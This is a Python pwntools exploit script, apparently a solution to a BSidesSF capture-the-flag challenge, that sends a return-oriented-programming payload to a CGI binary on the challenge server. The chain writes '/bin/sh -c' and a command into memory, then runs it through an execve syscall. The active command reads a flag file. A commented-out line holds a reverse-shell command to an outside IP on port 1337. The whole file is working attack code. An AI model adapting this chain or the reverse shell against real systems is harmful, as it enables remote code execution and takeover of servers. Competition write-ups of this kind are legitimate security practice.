#!/usr/bin/python3
from pwn import *
import requests

# =========================================================
#                          SETUP
# =========================================================
exe = "./auth.cgi"  # <-- change this
elf = context.binary = ELF(exe, checksec=True)
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv)

gdbscript = """
init-pwndbg
break main
""".format(
    **locals()
)

def www(what, where):
    pop_rsi = 0x40f782
    pop_rax = 0x4387a7
    mov_rsi_rax = 0x43b0f1
    
    payload = flat(
        pop_rsi,
        where,
        pop_rax,
        what,
        mov_rsi_rax,
    )
    return payload


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    # io = initialize()
    # rop = ROP(exe)

    what1 = b"/bin/sh\x00"
    what2 = b"-c\x00\x00\x00\x00\x00\x00"
    # spawn_shell = [b'sh -i >&', b' /dev/tc', b'p/18.136', b'.118.43/', b'1337 0>&', b'1\x00\x00\x00\x00\x00\x00\x00']
    spawn_shell = [b'cat /hom', b'e/ctf/fl', b'ag.txt\x00\x00', b'\x00\x00\x00\x00\x00\x00\x00\x00', b'\x00\x00\x00\x00\x00\x00\x00\x00', b'\x00\x00\x00\x00\x00\x00\x00\x00'] # cat flag doang
    
    pop_rax = 0x4387a7
    pop_rdi = 0x401d90
    pop_rsi = 0x40f782
    pop_rdx_rbx = 0x4696d7
    syscall = 0x4011a2
    addr = 0x4a7380
    
    offset = 168
    payload = flat({
        offset: [
            www(what1, addr), # /bin/sh
            www(what2, addr + 8), # -c
            www(spawn_shell[0], addr + 16), # cat /home/ctf/flag.txt
            www(spawn_shell[1], addr + 24),
            www(spawn_shell[2], addr + 32),
            
            www(addr, addr + 40), # points to /bin/sh
            www(addr + 8, addr + 48), # points to -c
            www(addr + 16, addr + 56), # points to cat /home/ctf/flag.txt
            
            pop_rdi,
            addr,
            
            pop_rsi,
            addr + 40,
            
            pop_rdx_rbx,
            0,
            0,
            
            pop_rax,
            0x3b,
            syscall
        ]
    })
    
    response = requests.post("http://cant-give-in-secure-05060d6d.challenges.bsidessf.net:8080/cgi-bin/auth.cgi", data=payload)
    print(response.text)
    # write("payload", payload)
    
    # io.send(payload)
    # io.interactive()


if __name__ == "__main__":
    exploit()